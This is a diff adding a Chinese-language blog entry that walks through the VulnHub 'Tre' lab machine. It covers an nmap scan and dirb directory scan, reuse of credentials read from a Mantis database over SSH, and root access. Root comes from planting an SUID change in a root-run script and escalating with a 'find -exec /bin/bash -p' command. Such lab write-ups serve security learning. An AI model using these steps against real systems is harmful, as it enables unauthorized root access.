@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Tre</title>
+      <link href="/2020/06/17/tre/"/>
+      <url>/2020/06/17/tre/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>  nmap </p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap -p1-65535 -sV 192.168.232.156Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 05:16 EDTNmap scan report for bogon (192.168.232.156)Host is up (0.00042s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)80/tcp   open  http    Apache httpd 2.4.38 ((Debian))8082/tcp open  http    nginx 1.14.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.73 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>80 和 8082 两个端口呈现一样的内容</p><p><img src="image-20200617171807595.png" alt></p><blockquote><p>  dirb 所扫描目录</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">dirb http://192.168.232.156/ /usr/share/dirb/wordlists/big.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20200617172515530.png" alt></p><p><img src="image-20200617172609404.png" alt></p><p><img src="image-20200617172628731.png" alt></p><p>在扫一下网站找找登陆页面</p><p><img src="image-20200617172936104.png" alt></p><p>访问并登陆</p><p><img src="image-20200617173100239.png" alt></p><p>查看 <code>mantis_user_table</code> 表的内容</p><p><img src="image-20200617173221641.png" alt> </p><p>看着 username:realname 就像是 user:passwd</p><p>其实我开始的思路是把 tre 用户的 password 字段换了，登陆后台，确实有个后台可以进去，但我发现不会getshell</p><p><img src="1.JPG" alt></p><p>用得到了用户名和密码登陆 ssh</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ ssh tre@192.168.232.156tre@192.168.232.156's password: Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Jun 17 05:01:38 2020 from 192.168.232.153tre@tre:~$ tre@tre:~$ sudo -lMatching Defaults entries for tre on tre:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser tre may run the following commands on tre:    (ALL) NOPASSWD: /sbin/shutdowntre@tre:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以执行 shutdown 是不是机器重启会启动什么服务之类的，而这类服务貌似权限都挺高</p><p>传一个 pspy64 上去</p><p><img src="image-20200617173942709.png" alt></p><p> root 每秒钟都会执行一次 check-system ，加两个语句进去看会不被执行</p><p><img src="image-20200617174104097.png" alt></p><p>修改后查看 find 和 ip 的权限没有改变，想到 linux 有个特点重启生效~</p><p><img src="image-20200617174438968.png" alt></p><p>看到 find 就有 suid 权限了</p><pre class="line-numbers language-shell"><code class="language-shell">tre@tre:~$ tre@tre:~$ find . -exec /bin/bash -p \; -quitbash-5.0# bash-5.0# whoamirootbash-5.0# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Geisha</title>
       <link href="/2020/06/13/geisha/"/>
       <url>/2020/06/13/geisha/</url>
